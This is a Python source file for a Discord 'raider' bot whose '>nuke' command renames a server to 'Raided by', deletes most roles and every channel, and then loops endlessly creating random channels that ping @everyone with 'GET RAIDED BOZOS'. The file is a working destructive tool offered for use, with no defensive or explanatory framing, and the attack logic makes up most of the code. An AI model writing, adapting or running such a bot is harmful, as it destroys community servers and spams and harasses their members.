import discord
from discord.ext import commands
import asyncio
import random
import string
import colorama
from colorama import Fore

colorama.init()

print(Fore.RED, "  ____                      __                      __  __     _           __     ")
print(Fore.RED, "/\   _`\             __    /\ \                    /\ \/\ \  /' \        /'__`\   ")
print(Fore.MAGENTA, "\ \  \L\ \     __   /\_\   \_\ \     __    _ __    \ \ \ \ \/\_, \      /\ \/\ \  ")
print(Fore.MAGENTA, " \ \  ,  /   /'__`\ \/\ \  /'_` \  /'__`\ /\`'__\   \ \ \ \ \/_/\ \     \ \ \ \ \ ")
print(Fore.BLUE, "  \ \ \ \ \ /\ \L\.\_\ \ \/\ \L\ \/\  __/ \ \ \/     \ \ \_/ \ \ \ \  __ \ \ \_\ \ ")
print(Fore.BLUE, "   \ \_\ \_\ \__/.\_\ \ \_\ \___,_\ \____\ \ \_\      \ `\___/  \ \_\/\_\ \ \____/")
print(Fore.CYAN, "    \/_/\/_/\/__/\/_/  \/_/\/__,_ /\/____/  \/_/      `\/__ /    \/_/\/_/  \/___/ \n")

print(Fore.YELLOW + "Enter your bot token:" + Fore.RESET)
botToken = input()
print(Fore.YELLOW + "Enter your Discord ID:" + Fore.RESET)
allowed_users = str(input())
keepLooking = False


bot = commands.Bot(command_prefix=commands.when_mentioned_or(">"))


@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="your mom on OnlyFans"), status=discord.Status.idle)
    print(Fore.GREEN +
          f'Logged in as {bot.user} (Bot ID: {bot.user.id})' + Fore.RESET)


@bot.command()
async def ping(ctx):
    await ctx.send(f'\U0001f4e1 My latency is **{round(bot.latency * 1000)}ms**')


@bot.command()
async def nuke(ctx, id: str):
    global keepLooking

    if id in allowed_users:
        await ctx.channel.send('\U0001f559 Type your Discord ID again to confirm. You have **10 seconds** before the command expires.')

        def is_correct(m):
            return m.author.id == ctx.author.id

        try:
            confirm = await bot.wait_for('message', check=is_correct, timeout=10.0)

            if str(confirm.content) == str(ctx.author.id):
                keepLooking = True
                roleCount = 0
                channelCount = 0

                await confirm.add_reaction("\u2705")
                await ctx.guild.edit(name=f"Raided by {bot.user.name}")

                for role in ctx.guild.roles:
                    if role.is_bot_managed() or role.id == ctx.guild.id or role.is_premium_subscriber() or role.is_integration():
                        continue

                    await role.delete()
                    roleCount = roleCount + 1

                print(
                    Fore.GREEN + f"Succesfully deleted {roleCount} roles. Deleting channels..." + Fore.RESET)

                for channel in ctx.guild.channels:
                    await channel.delete()
                    channelCount = channelCount + 1

                print(
                    Fore.GREEN + f"Succesfully deleted {channelCount} channels. Starting loop..." + Fore.RESET)

                while keepLooking:
                    output_string = ''.join(random.SystemRandom().choice(
                        string.ascii_letters + string.digits) for i in range(15))
                    channel = await ctx.message.guild.create_text_channel(output_string)
                    await channel.send(f"@everyone **GET RAIDED BOZOS**")
            else:
                keepLooking = False
                noID = await ctx.channel.send("\u26d4 No confirmation given.")
                await asyncio.sleep(2.0)
                await ctx.message.delete()
                await noID.delete()
                return
        except asyncio.TimeoutError:
            keepLooking = False
            timeExpired = await ctx.channel.send("\u26d4 Time's up.")
            await asyncio.sleep(2.0)
            await ctx.message.delete()
            await timeExpired.delete()
            return
        except:
            keepLooking = False
            unknownError = await ctx.channel.send("\u26d4 An unexpected error occurred.")
            await asyncio.sleep(2.0)
            await ctx.message.delete()
            await unknownError.delete()
            return

    else:
        return


@bot.command()
async def nukestop(ctx):
    global keepLooking

    if str(ctx.author.id) in allowed_users:
        if keepLooking:
            keepLooking = False
            raidStop = await ctx.channel.send("\u2705 The raid has succesfully stopped.")
            await asyncio.sleep(2.0)
            await ctx.message.delete()
            await raidStop.delete()
            return
        if keepLooking == False:
            noRaid = await ctx.channel.send("\u26d4 There's no raid going on.")
            await asyncio.sleep(2.0)
            await ctx.message.delete()
            await noRaid.delete()
            return
        else:
            unknownError2 = await ctx.channel.send("\u26d4 An unexpected error occurred.")
            await asyncio.sleep(2.0)
            await ctx.message.delete()
            await unknownError2.delete()

    else:
        return


bot.run(botToken)
